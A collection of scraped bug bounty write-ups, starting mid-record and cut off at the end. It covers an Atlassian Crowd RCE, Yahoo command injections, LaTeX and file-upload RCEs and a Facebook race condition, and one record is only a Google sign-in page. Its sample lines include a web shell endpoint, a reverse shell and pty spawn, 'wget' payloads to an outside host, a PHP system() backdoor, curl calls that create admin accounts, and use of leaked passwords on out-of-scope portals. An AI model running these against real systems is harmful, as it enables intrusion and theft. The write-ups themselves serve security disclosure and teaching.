dashboard, cms, and other). 2.2.1. The Result — Recon from Google Dork One very good result that I got was, there are about 4 accounts that I found that can be used to access the “in-scope” program portal and this accounts has access to customer data. And yes, this account uses a password pattern that I found at the Github recon activity. Press enter or click to view image in full size Figure 11 Few Good Results On the other side, I also able to access one of their “ super admin ” account (so sad, not in the “in-scope” assets) which contains many of the big names of companies that are their clients (with a lot of transaction data). (I’m sorry, I can’t give a screenshot of those portal). Press enter or click to view image in full size Figure 12 Resolved Already — They just didn’t Update yet And what else? Well, as said before, I also success to get few accesses to another endpoint (with the found account) that contained a lot of sensitive information. But what about the information that can’t be used because it requires an internal access? No worries. We will keep this, as we keep the information that we got from Github recon . 2.3. Unauthenticated RCE at Outdated Version of Atlassian Crowd 2.3.1. Found Outdated Atlassian Crowd Application So, I have gathered a lot of their internal information. I also have their passwords pattern. But I have a real problem here, which is, although I have reported almost all of the issues that I found from the 1st and 2nd stages (that can be accessed from public area), I still don’t have an internal access yet . From this situation, then I try to see the results of my subdomain enumeration again. To make it easy, I use the aquatone capture feature . After looking carefully, finally I found an endpoint that looks old. It only contains few words with clickable link, for example: 1st words, 2nd words, 3rd words, and crowd. From all of the words, the only thing that caught my attention was “ crowd ”. ( Note : as expected, other clickable links don’t contain anything good to be exploited). When visiting the “crowd” clickable link, then I was redirected to a subdomain that contained an Atlassian Crowd Application. Press enter or click to view image in full size Figure 13 Found the Outdated Atlassian Crowd Application As a simple note, while conduct a fast testing , I also put myself to focus on 3 things (for people who take the offensive-technical certification and similar with it or playing around with HackTheBox and similar with it, will be familiar with this common concept), which are: Test towards used accounts and passwords Testing towards patch that hasn’t been implemented yet (obsolete/ outdated version) Test towards configuration mistakes that have been implemented. In short, I found the exploit information by using the simple Google Dork. Press enter or click to view image in full size Figure 14 Looking the Information about the Public Exploit After looking carefully at the information, I found if the used version is affected with this Unauthenticated RCE issue. It marked as CVE-2019–11580 . The next thing that I do is looking for the possible released public exploit. In short, I got this link: Press enter or click to view image in full size Figure 15 Public Exploit of Few Atlassian Crowd and Crowd Data Center Versions — RCE 2.3.2. How I Know if this one is Vulnerable? There is simple thing that can be executed to determine whether the application is vulnerable or not. All we need to do is just visit the uploadplugin.action endpoint at /admin/ path. If the application show an error message “ HTTP Status 400 — Requires POST ”, then most likely, the application is vulnerable to this RCE (This tells us if the plugin is available and can be used without the need of authentication). Press enter or click to view image in full size Figure 16 Show an Error Message “Requires POST” 2.3.3. The Execution Reproducing this issue is quite simple. All we need to do is just download the working exploit that one of them is could be found at https://github.com/jas502n/CVE-2019-11580 . When the script was executed to the target (and the target is vulnerable), then the web shell will appear automatically. ( And yes, we are in )! Press enter or click to view image in full size Figure 17 Executing the Script To accessing the web shell via web browser, then we just need to visit the /crowd/plugins/servlet/exp?cmd=command_here endpoint. Just replace the “ command_here ” with another OS Command. Press enter or click to view image in full size Figure 18 Root Access To summarize, very good things about exploitation of this target are: We don’t need any valid username or password to execute this one. (that’s why it called unauthenticated / pre-authenticated RCE); The second one, the RCE was executed as root user . It means, we don’t need to do anything to get the root access; And the third one, there is no security perimeter that protect this application . So, we found no difficulties when exploiting the target. 2.3.4. It doesn’t Enough, we need a Shell that can Interact with the System! Since we have no interactive shell yet (the shell that could interact with the OS by passing the data that we input ), then we have to connect this shell to our machine first. Commonly, I use the Reverse Shell cheatsheet from PentestMonkey . But so sad, there are no command that works that can connect the shell to my machine. Most likely, the application filter the special character such as > & , ‘ and “ From this situation, then I put the simple reverse shell python script at my machine then I forced the target to download it (by using the available web shell). Figure 19 Simple Reverse Shell Script in Python Press enter or click to view image in full size Figure 20 Downloading the Script from Our Machine At this case, we finally have our own reverse shell script (in python) at the target’s server. But the problem is, this script isn’t executable. So, next thing that we should do is to chmod the script (for example with 700, since our access is root already). Press enter or click to view image in full size Figure 21 Chmod the Python Script into 700 So, now our script should be executable since we have changed the permission. Press enter or click to view image in full size Figure 22 Script become Executable — rwx After our script has been downloaded, then we just need to setup the listener at our server. $ nc -lvp <our_port> Then, try to execute the python script at the target’s server via our deployed web shell: Press enter or click to view image in full size Figure 23 Gain the Interactive Shell Press enter or click to view image in full size Figure 24 Shell was Executed as Root At the first time we can connect to our reverse shell, basically we still don’t have an interactive shell yet. So, thing that we need to do is just to run a simple command with python: python -c 'import pty;pty.spawn(\"/bin/bash\")' From here, then we finally have the interactive shell. We also could connect into the database or other service without worry. Note: See G0tmi1k’s personal blog for more information: “ Basic Linux Privilege Escalation ”. Press enter or click to view image in full size Figure 25 The Interactive Shell that allow us to Connect into the Available Database 2.3.5. What’s Next? So, one of the best things from this RCE is, this server is located at their internal network. When I tried to ping several public assets, I also got a nice (internal IP Address) response. And yes, it means, we are in the internal network of one of the biggest ICT company in the world! And now, remember about much of internal information that we got and keep from the first and second stages? Then we also can use it at this 3rd stages! And finally, our journey to get an internal access at this company has been finished. I have reported the issue and got a very nice response. Disclaimer: I didn’t execute any further. All I do only shows things that can be used from the data that I got from the previous stages. Just don’t do it in bug hunting without any permission. Note: Although the issue was found in “out-scope” target, at least I have reach one of my dream in my bug hunting activity, which is get an access into one of the powerful ICT company in the world from external area (well, yes, in my point of view, it seems more difficult to get RCE and get an internal access in bug hunting than in formal pentest jobs. Sometimes we joke around with other friends, “ getting an RCE in bug hunting / bug bounty program — looks like a fairy tale ”). Press enter or click to view image in full size Figure 26 The Issue was Resolved Already Press enter or click to view image in full size Figure 27 Nice Response 2.3.6. Additional Information 2.3.6.1. Login into Crowd’s Database There is a possibility if some of you ask about how I can login into their crowd’s database. As an additional information, they also have the installed Atlassian Confluence at this server. And for the record , I honestly have no idea about the integration flow of Atlassian Confluence and Atlassian Crowd or even how it works. The thing that comes into my mind, if I see a database connection (via netstat), then most likely, there is a database connection configuration on this server too (that commonly store the credentials in cleartext). After searching for some references, I finally found an article that explained if the credentials were stored at <confluence_home>/confluence.cfg.xml file. Press enter or click to view image in full size Figure 28 An Article that Explain the Location of Database Connection Configuration Figure 29 Trying to Find out the Location By using the simple “locate” command (since I don’t know the exact location of the confluence.cfg.xml file), then I find out if it was located at /opt. Press enter or click to view image in full size Figure 30 ClearText of Database Connection String And for the rest, as you clearly see at previous section, I success to login into their database. Press enter or click to view image in full size Figure 31 Success to Login into the App’s Database 2.3.6.2. Stored Password is Encrypted, Can You Login? Yes, I believe in some situations (at formal activity), it would better if we get the clear view of data (for example, accessing the GUI) so it can help us to have better understanding in identifying possible risks that may exist (either to identify application flaw that might exist or to find the data that might be used for other executions). So, should we brute force ? Yes, we can also brute force the passwords, but I don’t think it’s a good choice if our time is very short (unless you have great cracking machine). Can we replace the encrypted password with the new created password (for example from our own crowd)? I believe that is possible. Atlassian also provides this “solution” at their official portal. In short, we can replace the existing administrator (hash) password with hash value for “ admin ”. Press enter or click to view image in full size Figure 32 How to Replace Administrator Password Did I execute this? The answer is NO . Without any permission, we can’t do it. (yes, in a real attack, the Attacker will do it without asking any permissions, but kindly note that in bug hunting, we didn’t come with the intention to breach ). At the other side, replacing this password will also make the administrator / developer realize if something wrong has happened. So, with few considerations, I choose to create a new account just to notify the program owner if there is a risk that also could allow an Attacker to login into the existing application. From here, then I try to find out about the possibility to create a a new account without the need to login into the application. After searching few references, I finally found out if this was possible through REST as long as we had an administrator password of crowd. Press enter or click to view image in full size Figure 33 Find Out the Location of File that Stored Administrator Password Since the version of affected Atlassian Crowd was v.2.x, then this article still valid for us to create an account. Press enter or click to view image in full size Figure 34 The Attributes of crowd.properties File Again, by using the simple “locate” command, then I successfully found the location. 2.3.6.2.1. Create an Account via REST This article below helped me a lot in creating an account. Press enter or click to view image in full size Figure 35 Create New Account via REST API In short, it should be like this: curl -i -X POST http://subdomain.target.com /crowd/rest/usermanagement/latest/user?username= your_new_user_here -H 'Content-type: application/json' -H 'Accept: application/json' -u crowd_administrator_username_here : crowd_administrator_password_here -d' > { > \"email\": \" your@email_here.tld \", > \"name\": \" your_new_user_here \", > \"password\": { > \"value\": \" your_new_user_password_here \" > } > } > ' Note : your_new_user_here = means our username that we would like to create crowd_administrator_username_here = means the crowd’s administrator username crowd_administrator_password_here = means the crowd’s administrator password your@email_here.tld = means our email for our username that we would like to create your_new_user_password_here = means password that we would like to use for our account If success, then we will get a nice response: HTTP/1.1 201 Created Server: Apache-Coyote/1.1 Redacted. Is it finish? So sad, no. We need to activate our account. In reality, (as far as I know) there are 2 ways to do this, which are by asking the administrator to activate our account (that’s not possible, right?) or we activate it ourselves with other REST API function. 2.3.6.2.2. Activating New Account via REST From this article, we will get the answer about how we can activate our account through API. Press enter or click to view image in full size Figure 36 Tutorial — How to Activate Our Account via API In short, it should be like this: curl -i -u crowd_administrator_username_here : crowd_administrator_password_here -X PUT --data '{\"name\":\" your_new_user_here \", \"active\":\"true\"}' http://subdomain.target.com /crowd/rest/usermanagement/1/user?username= your_new_user_here --header 'Content-Type: application/json' --header 'Accept: application/json' Note : your_new_user_here = means our username that we created earlier crowd_administrator_username_here = means the crowd’s administrator username crowd_administrator_password_here = means the crowd’s administrator password If success, then we will get a simple response: HTTP/1.1 204 No Content Server: Apache-Coyote/1.1 Redacted. After that, we will be able to login into the application. Press enter or click to view image in full size Figure 37 Success to Login into the Application III. LESSON LEARNED So, here we are, almost at the end of the article. In this section, I would like to add a simple recap to make it easier for readers to understand few lessons of this simple journey: In my simple perspective (just please kindly correct me if I’m wrong), recon doesn’t always mean an asset discovery activity. In this one, it can also mean that we try to learn how the API works, target’s development culture, and more. Remember, while responding one of @Mongobug ’s tweets, @NahamSec also explains about one of recon’s definitions in the very simple words : “ Recon shouldn’t just be limited to finding assets and outdated stuff. It’s also understanding the app and finding functionality that’s not easily accessible. There needs to be a balance between recon and good ol hacking on the application in order to be successful ”. Press enter or click to view image in full size Figure 38 Recon doesn’t always mean an Asset Discovery Activity Don’t ever throw away the results of your hunt (except in the formal jobs that require you to delete all of those data after completing the work). On one occasion, this can also be useful for your next moves. In this case, I didn’t discard my hunting results at the first stage. And Alhamdulillah, the good thing is, those results can be used in the second stage which finally “produces” 9,000 USD. Please kindly enjoy your bug hunting activity. Maybe not everyone agrees with this, but, don’t always think about the bounty (especially if you just start in this one and never has an experience with it). Try to test the “legal/official” target as much as you can. InshaAllah it can improve your knowledge, methods, and anything when looking for bugs in the target that offering bounties. I tried to learn much technologies (that I had never face) from the target that didn’t offer bounty (but open the responsible disclosure program). In this point, one thing that I can say is, those used technologies aren’t always the technology that we face every day. In other words, we need an official “land” (legal target) to learn it and make us familiar with it. Just try going back to basics. If you think that someone can do it easily, then try to see these motivational words from @BruteLogic : “ They think we do things in a snap. But there’s a lot of hard work, endless hours of trial and error. Many hours parsing search engine results, reading tons of not so helpful information. What they end up seeing is the show time. We make it look easy but it’s not.” Press enter or click to view image in full size Figure 39 One of the Motivational Words And the last one is my really favorite quotes (seriously, this is beautiful): Press enter or click to view image in full size Figure 40 No one Goes from Noob to Elite just like that These words really motivate me a lot to share things even though things that I share aren’t always good things. But with the permission of Allah, I got a lot of feedback that motivate me to correct my mistakes or to improve things. IV. CLOSING Well, even though the third stage (RCE) has no bounty, at least I can achieve one of my dreams, which is “enter” the internal network of big names company (in bug hunting / bug bounty program), then look their internal IP (looks funny, but satisfies me). Apart from the reward stuff, as I said, just enjoy your bug hunting activity. And finally, my article ends here. See you next time, InshaAllah. V. CREDITS Th3g3nt3lman talks at Bugcrowd University: Github Recon and Sensitive Data Exposure . Microsoft Yammer - oAuth Bypass Session Vulnerability by Ateeq Khan. Blok Search Indexing with ‘noindex’ - Google’s Support. CVE-2019–11580 Reverse Shell Cheatsheet - Pentest Monkey Basic Linux Privilege Escalation by G0tmi1k https://confluence.atlassian.com/crowd/the-crowd-properties-file-98665664.html https://community.atlassian.com/t5/Crowd-questions/Is-it-possible-to-create-users-via-REST-api/qaq-p/109667 https://confluence.atlassian.com/crowdkb/how-to-deactivate-activate-a-user-through-api-814197032.html Follow Infosec Write-ups for more such awesome write-ups. InfoSec Write-ups A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub… medium.com Bug Bounty Rce Information Disclosure Recon Google Dork -- -- 4 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by YoKo Kho 1.3K followers · 38 following Independent | OSCP, CRTO, eWPTX, eCPTX | https://twitter.com/YoKoAcc | https://bugcrowd.com/YokoKho | https://leanpub.com/bughunting101 (Bahasa) Free! Responses ( 4 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://www.seekurity.com/blog/general/the-fuzz-the-bug-the-action-a-race-condition-bug-in-facebook-chat-groups-leads-to-spy-on-conversations/", "title": "The Fuzz…The Bug..The Action – A Race Condition bug in Facebook Chat Groups leads to spy on conversations! – Seekurity", "friendly_explanation": "This is a bug bounty writeup from https://www.seekurity.com/blog/general/the-fuzz-the-bug-the-action-a-race-condition-bug-in-facebook-chat-groups-leads-to-spy-on-conversations/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nThe Fuzz…The Bug..The Action – A Race Condition bug in Facebook Chat Groups leads to spy on conversations! – Seekurity close close Close Home Services Blog About Contact Us Home Services Blog About Contact Us menu Email: [email protected] folder Filed in General , PoC Gallery , Write Ups Tweet Share Read later The Fuzz...The Bug..The Action - A Race Condition bug in Facebook Chat Groups leads to spy on conversations! Seif Elsallamy comment 0 Comments access_time 4 min read Hi Folks, Long time no see, it’s Seif Elsallamy, Remember me ? if not 🙁 you may go through my previous blogs Stored XSS in the heart of the Russian email provider giant (Mail.ru) , Rolling around and Bypassing Facebook’s Linkshim protection on iOS Today I’m gonna show you a race condition bug which i recently fall in love with those kind of vulnerabilities especially in when it comes to Facebook also i want to mention that this bug is super simple to understand It’s not complicated, the only complicated part is how to test and finding it. First thing first, What is Race condition ? So a race condition is a flaw that produces an unexpected result when the timing of actions impact other actions. An example may be seen on a multithreaded application where actions are being performed on the same data. Race conditions, by their very nature, are difficult to test for. As example we got a coupon code or a voucher that gonna give us $10 for shopping online. we enters this code multiple times very fast (before the coupon code expires in the server side) so instead of getting $10 we may get $20 or $30 maybe $100 depends on the server. So I think the main reason for me to love this vulnerability is the unexpected results that may occurs. I think that developers doesn’t consider Race Conditioning while building most of the applications, It’s really unexpected behavior/vulnerability. Enough the Blah Blah Blah, show me some action… 😀 The Fuzz…The Bug..The Action… On Facebook by creating a group conversations didn’t consider the race condition to occur results unexpected behaviour that may put some Facebook users at a risk which is “the ability to spy on a group conversations” So by creating a group conversation invite some users to it choose one of the users that you invited speedily remove and re-add this user to the conversation multiple times (kind of a typical test for exploiting race condition bugs) this user will be invisible BUT can read write remove users and add also there is no “seen” sign after the user looks for chat inside the conversation. So let’s imagine an attack scenario (in the era of the spies). Want a bed story? prepare your doll: -We got 4 innocent users let’s choose a random names for them Symbian, Ali, Hiram and Mahmoud -So yesterday Symbian , Ali and Mahmoud were hanging out together. -Symbian was whispering Ali then they both laughed very hard and Mahmoud was really upset and he keeps asking Symbian about what they laughed for but every time Mahmoud asking they both laugh again. -So at night everyone drive to his home Mahmoud called Hiram complains about the thing that Symbian and Ali were laughing for. -So Hiram told Mahmoud about a bug on Facebook to spy on group conversations and he told Mahmoud that he gonna add him to a group conversation with Symbian and Ali to spy on their chat. -So Hiram opens up the computer added Symbian and Ali to a group conversation and then Added Mahmoud and Removed him speedily multiple times till he became invisible. -Then Hiram sent “sorry I got some error on Facebook I’ll be back later” and left the conversation. -Now Symbian and Ali are the only ones in this conversation and Mahmoud is with them but he is invisible so he can spy on their chat to know what were they both laughing for. – Then Symbian “typing…” and Mahmoud is really excited while he was watching the indicator of “typing…” then Symbian said “good night :D” and left the conversation then Ali left it too. -Sorry Mahmoud hehe :D! So this is the time that you allll weee waiting forrrrr! The PoC Video! The bug was responsibly reported to Facebook by @Seekurity team and we got a really satisfying reward, Thanks for Facebook team for keeping us safe. Thank You too for reading this!! A minute if you please! Building a website, an application or any kind of business? Or already have one? Worried about your security? Think twice before going public and let us protect your business ! Action Race Condition Bug Chat conversations Facebook Fuzz Groups in leads on spy to Previous Next Leave a Reply Cancel reply Your email address will not be published. Required fields are marked * Name * Email * Website Are you human? Please solve: Cancel Post Comment Next article Hack the Hackers and Track the Trackers: CVE-2017-17713 and CVE-2017-17714 - Multiple SQL Injections and XSS Vulnerabilities found in the Hackers tracking tool \"Trape\" from \"Boxug\" Translate this blog Scroll Up"}
{"source_url": "https://medium.com/@kedrisec/how-i-found-2-9-rce-at-yahoo-bug-bounty-program-20ab50dbfac7", "title": "How I found 2.9 RCE at Yahoo! Bug Bounty program | by Kedrisec | Medium", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/@kedrisec/how-i-found-2-9-rce-at-yahoo-bug-bounty-program-20ab50dbfac7. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nHow I found 2.9 RCE at Yahoo! Bug Bounty program | by Kedrisec | Medium Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in How I found 2.9 RCE at Yahoo! Bug Bounty program Kedrisec 4 min read · Apr 30, 2018 -- 5 Listen Share Hi. I’m kedrisec and I want to describe 3 vulnerabilities that I found as part of the security research at Yahoo Bug Bounty program . So, lets begin. Foreword The Yahoo’s Bug Bounty program include a lot of services and I decided to work around Brightroll. First RCE I started with the regular thing when you do bug hunting, it’s reconnaissance. I do nothing irregular: Google, Aquatone etc… So, when Aquatone show me some interesting port I decided to work around it. That’s what I saw: Press enter or click to view image in full size Queue list Looks like something insteresting, doesn’t it? Ok, It’s time to explore the functional of this thing. As I understood this panel used for creating some tasks(messages) like a RabbitMQ. So, when I clicked on one of the queues I saw the next picture: Press enter or click to view image in full size Message lists This is a lists of messages of the queue. I decide to click on “New Message” link and I saw form (It seemed strange for me because I had no idea what is that): Press enter or click to view image in full size Strage form When I tried to create a new message I was filling this fields randomly. After that I clicked to the submit button and I was redirected to the page of my freshly created message. I saw the window that looks like terminal but I couldn’t write to it anything. This window show me an error (I’m sorry but I haven’t screenshot of this). I come back to message lists and choose one of them. I noticed that it show me filled “Strage” form. It was string in JSON format and looks like this: json:{“sub_bound”:true,”hostname”:” REDACTED \",”timestamp”:”2017/07/01/1649\",”s3_key”:” REDACTED ”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:” REDACTED \",\"type\":\" REDACTED \",\"interval_id\":\" REDACTED \",\"pod_id\":\"22\"} I tried to create a new message with this value of parameter 1 field. And after redirect to created message I noticed that several of json values put in to string that was similar to bash command. Press enter or click to view image in full size Window like terminal So, I just try to write “|wget mywebsite.com” aaaaaand it was working ^^. I’ve simplified the hacking process, actualy it was taking about 2 days of work. Final payload was : json:{“sub_bound”:true,”hostname”:”REDACTED\",”timestamp”:”2017/07/01/1649\",”s3_key”:”REDACTED”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:”REDACTED\",\"type\":\"REDACTED\",\"interval_id\":\"REDACTED\",\"pod_id\":\" 22|wget http://m yhost.name \"} Brightroll RCE Second RCE Actually, it was the RCE via the same service that was in previous RCE. After about 3 months I found the different host with the same service on the same port. But at this time my previous payload didn’t work. If I remember correctly the reason of it was that symbols | & ; ` { } were filtred. I could bypass it after 1 day working around it. The bypass looks like something that: json:{“sub_bound”:true,”hostname”:”REDACTED”,”timestamp”:”2017/10/23/2248\",”s3_key”:”REDACTED”,”nop”:false,”providers”:[“Google”,”AWS”],”version”:3,”checkin_queue”:”REDACTED”,”type”:”REDACTED”,”interval_id”:”REDACTED”,”pod_id”:” 23\\u000awget\\u0020http://myhost.name \"} Third ALMOST RCE This vulnerability is the most interesting of all my finds. So, I started my research of yahoosmallbusiness store after creating a few products to have access to functions related with it. While I was discovering a functional I noticed that when I visit email templates page ajax send a few requests to get path to the images of products that showed on the page. One of the requests was sended to objinfo_data.php with parameter id. As I thounght this script was used to resize products image. So, this part is important. When I was creating a products I notice that request that used to create product containt a couple of urls to image but not directly binary image data. My suggestion was that: “What if the script get the link of product image and use it to resize.”. I thought it’s may be SSRF. I edited the product, changed image url to my host and port and runned netcat. After that I use product id of this product in request to objinfo_data.php. Netcat showed me the request and I noticed that User-Agent was Curl. After that I tried to get RCE any possible ways, but have no results:( It just wasn’t working. After all my torment’s I decide to ask my collegues about it. One of them offered to try to use “-A something” and if I will see “User-Agent: something” in the request in netcat it’s possble to injection to argument string. I tried and it worked! After that another my collegue immediately offer to me use flag -T. This flag get file from file system and attach it to request. I used it and was able to read /etc/passwd. Why I called it almost RCE when I cant execute another commands? Because curl have another interesting flag “-o” this flag can be used to write output to file system. Therefore, If I could found web directory on the server, I just was able to write web-shell there and (if it was over firewall) execute it via curl :) Yahoo Small Business curl argument injection. Bug Bounty Yahoo Information Security -- -- 5 Written by Kedrisec 254 followers · 2 following Responses ( 5 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce", "title": "Sign in - Google Accounts", "friendly_explanation": "This is a bug bounty writeup from https://sites.google.com/site/testsitehacking/-36k-google-app-engine-rce. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nSign in - Google Accounts Sign in Use your Google Account Email or phone Forgot email? Not your computer? Use a private browsing window to sign in. Learn more about using Guest mode Next Create account Afrikaans azərbaycan bosanski català Čeština Cymraeg Dansk Deutsch eesti English (United Kingdom) English (United States) Español (España) Español (Latinoamérica) euskara Filipino Français (Canada) Français (France) Gaeilge galego Hrvatski Indonesia isiZulu íslenska Italiano Kiswahili latviešu lietuvių magyar Melayu Nederlands norsk o‘zbek polski Português (Brasil) Português (Portugal) română shqip Slovenčina slovenščina srpski (latinica) Suomi Svenska Tiếng Việt Türkçe Ελληνικά беларуская български кыргызча қазақ тілі македонски монгол Русский српски (ћирилица) Українська ქართული հայերեն ‫עברית‬‎ ‫اردو‬‎ ‫العربية‬‎ ‫فارسی‬‎ አማርኛ नेपाली मराठी हिन्दी অসমীয়া বাংলা ਪੰਜਾਬੀ ગુજરાતી ଓଡ଼ିଆ தமிழ் తెలుగు ಕನ್ನಡ മലയാളം සිංහල ไทย ລາວ မြန်မာ ខ្មែរ 한국어 中文（香港） 日本語 简体中文 繁體中文 Help Privacy Terms"}
{"source_url": "https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a", "title": "Latex to RCE, Private Bug Bounty Program | by Yasho | InfoSec Write-ups", "friendly_explanation": "This is a bug bounty writeup from https://medium.com/bugbountywriteup/latex-to-rce-private-bug-bounty-program-6a0b5b33d26a. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nLatex to RCE, Private Bug Bounty Program | by Yasho | InfoSec Write-ups Sitemap Open in app Sign up Sign in Medium Logo Write Sign up Sign in InfoSec Write-ups · Follow publication A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow publication Latex to RCE, Private Bug Bounty Program Yasho 2 min read · Jul 6, 2018 -- 1 Listen Share I had participated in a private bug bounty program about one year ago, I want to publish what I’ve learned from. The CMS was a journal site giving service to authors, editors and etc. I accomplished to get editor account by an XSS which I’m not going through with this story. In the editor’s role, there were many options, interesting ones were “XML checker” and “Converting LaTex codes to PDF”. The first one lets which is not related to our topic, the second one seemed interesting. Press enter or click to view image in full size Converting LaTex code to PDF A remote attacker can gain remote command execution thanks to LaTex code conversion, following links might be helpful: https://tex.stackexchange.com/questions/262625/security-latex-injection-hack https://0day.work/hacking-with-latex/ http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/ So I crafted an exploit code shown below in order to read local files in the server: Press enter or click to view image in full size Resulted in : Press enter or click to view image in full size Bingo, I’d the /etc/passwd content. The payload to command execution: Resulted in: Press enter or click to view image in full size Out of Band Technique The PDF conversion was annoying, I wanted to escalate my privileged, so I automated the procedure by Writing a code exploiting the flaw (LaTex to PDF) Writing a server by python receiving the result, converting it to clear text, saving it. The flow is shown below: Press enter or click to view image in full size Consequently: Press enter or click to view image in full size Afterward, I got conformable with this exploit, seeking the server, I got the database and Elastic-Search by SSRF and had fun. Bug Bounty Security Web Applications Hacking -- -- 1 Follow Published in InfoSec Write-ups 67K followers · Last published 18 hours ago A collection of write-ups from the best hackers in the world on topics ranging from bug bounties and CTFs to vulnhub machines, hardware challenges and real life encounters. Subscribe to our weekly newsletter for the coolest infosec updates: https://weekly.infosecwriteups.com/ Follow Written by Yasho 1.2K followers · 20 following Currently I write in https://securityflow.io Responses ( 1 ) See all responses Help Status About Careers Press Blog Privacy Rules Terms Text to speech"}
{"source_url": "https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/", "title": "Unrestricted File Upload to RCE | Bug Bounty POC - Security Breached Blog", "friendly_explanation": "This is a bug bounty writeup from https://blog.securitybreached.org/2017/12/19/unrestricted-file-upload-to-rce-bug-bounty-poc/. It explains in detail how the bug was found, exploited, and remediated. Here’s the full content:\n\nUnrestricted File Upload to RCE | Bug Bounty POC - Security Breached Blog Skip to content Security Breached Blog Hack Smart, Stay Safe: Comprehensive Guides to Cybersecurity and Bug Bounty December 19, 2017 Share BugBounty POC 4 Unrestricted File Upload to RCE | Bug Bounty POC by MuhammadKhizerJaved H ey Guys, Hope all of you guys are doing well, I’m an Active Bug Bounty participant, & also sometimes work as a Freelancer for some extra pocket money :p So I got a Project to test a site for possible security issues, while working on the Project i was able to bypass the file Upload functionality to Upload a shell to the website. It wasn’t a regular Bug Bounty Hunt so my target was Damn vulnerable but also fun to practice. ( I haven’t taken much screenshots during testing so will try to share as much info as i can ) Back to the POC, It all started by Logging into the account, The website was basically a team management portal and i was testing for any Cross Site Scripting issues, ( And i got one ) but then from setting their was an option to upload user profile image, So I decided to test it, the first thing i did was to check what if they Upload images on same site or on a 3rd party storage. all other images on that website was on https://targetsite.com/images/static/image.jpg so when i uploaded the simple image on the profile it was on https://taretsite.com/images/users/<ProfilID>/name.jpg Now the next thing was to try uploading any other extension, but if i try uploading any extension other than JPG, PNG, & GIF it popup a forbidden error. But while testing i realized that they send a GET request containing the filename & mime, in it https://targetsite.com/settings/19982638/avatar?name=teest.png&mime=image%2Fpng and the response of the request was 200OK simple & The next request was simple PUT request for file upload to the images directory https://targetsite.com/users/19982638/testtts.png I tried chaining the content of the PUT request as HTML or TXT but it always gets back a 500 Internal Server Error. It was because i forget that the referer header contains the last URL. But then tested it again By changing the name & mime in 1st GET request as it was added as Referer to the next PUT request and then i changed the content & file type in the PUT request. https://targetsite.com/settings/19982638/avatar?name=kj.html&mime=text%2Fhtml and Following that request i made changes to the PUT request to Upload an HTML file and it was Success…. Now I have a Stored XSS using HTML file, I bypassed the Same origin Policy, & X-Frame-Options Header. etc Now i decided to upload a PHP file, <?php if ( isset ( $_REQUEST [ ‘ cmd ‘ ])){ echo “ <pre> “ ; $cmd = ( $_REQUEST [ ‘ cmd ‘ ]); system ( $cmd ); echo “ </pre> “ ; die ; } ? > i used the simple one liner PHP backdoor for the test purposes. But One thing that made me angry was i wasn’t able to execute a PHP file for some reason it always gave me a 403 Forbidden error, But then i decided to try some other extensions, php=> 403 Forbidden But phps, phpt, php3, php4, php5=> 200 OK Target: http://targetsite.com/images/users/19982638/cmd.phps?cmd=cat+/etc/passwd i guess only the php extension was not getting uploaded but others worked, It was all for me to confirm the issue. Note: I haven’t disclosed the actual website that i worked with and posting this after the developer review this post. Share this: Click to share on X (Opens in new window) X Click to share on Facebook (Opens in new window) Facebook Click to share on LinkedIn (Opens in new window) LinkedIn Click to share on Reddit (Opens in new window) Reddit Click to share on Tumblr (Opens in new window) Tumblr Click to share on Telegram (Opens in new window) Telegram Click to share on WhatsApp (Opens in new window) WhatsApp Click to email a link to a friend (Opens in new window) Email Like this: Like Loading... Related Discover more from Security Breached Blog Subscribe to get the latest posts sent to your email. Type your email… Subscribe Tags: BugBounty POC RCE MuhammadKhizerJaved Dedicated and seasoned cybersecurity professional with over 8 years of active engagement in Bug Bounty Hunting, complemented by 4 years of experience as a Penetration Tester. Skilled in web and mobile application security testing and vulnerability assessment, I am actively involved in platforms like HackerOne and Bugcrowd. My contributions in the Bug Bounty arena have been recognized by over 200 reputable organizations, including Apple, Google, Facebook, The Government of Singapore, and The US Department of Defense. As an advocate for community growth, I actively contribute as a speaker, conducting sessions in local universities and presenting talks at various security conferences, both locally and internationally, including twice at BlackHat MEA, With a passion for growth, Always happy to connect with fellow security practitioners. Share on Facebook Share on X 4 replies on “Unrestricted File Upload to RCE | Bug Bounty POC” Gotts says: March 5, 2024 at 5:57 pm The author’s original and in-depth analysis was truly impressive. It’s commendable how the author delved into different aspects of the topic. Loading... Reply Getting Started in Bug Bounty Hunting | Complete Guide says: August 30, 2019 at 11:16 am […] Unrestricted File Upload to RCE Muhammad Khizer Javed […] Loading... Reply Bug Bounty Methodology (TTP- Tactics,Techniques and Procedures) V 2.0 ~ Cyberzombie says: June 30, 2019 at 11:21 am […] Unrestricted File Upload to RCE by Muhammad Khizer Javed […] Loading... Reply Guide 001 |Getting Started in Bug Bounty Hunting.. – Muhammad Khizer Javed says: June 3, 2019 at 3:44 am […] Unrestricted File Upload to RCE by Muhammad Khizer Javed […] Loading... Reply Leave a Reply Cancel reply This site uses Akismet to reduce spam. Learn how your comment data is processed. Next Security Researcher saved Careem from a Data Breach Previous HOW I WAS ABLE TO TAKEOVER FACEBOOK ACCOUNT | Bug Bounty Poc You may also like October 14, 2024 by MuhammadKhizerJaved AI Hijack: How I Took Control of an AI Assistant Discover how a 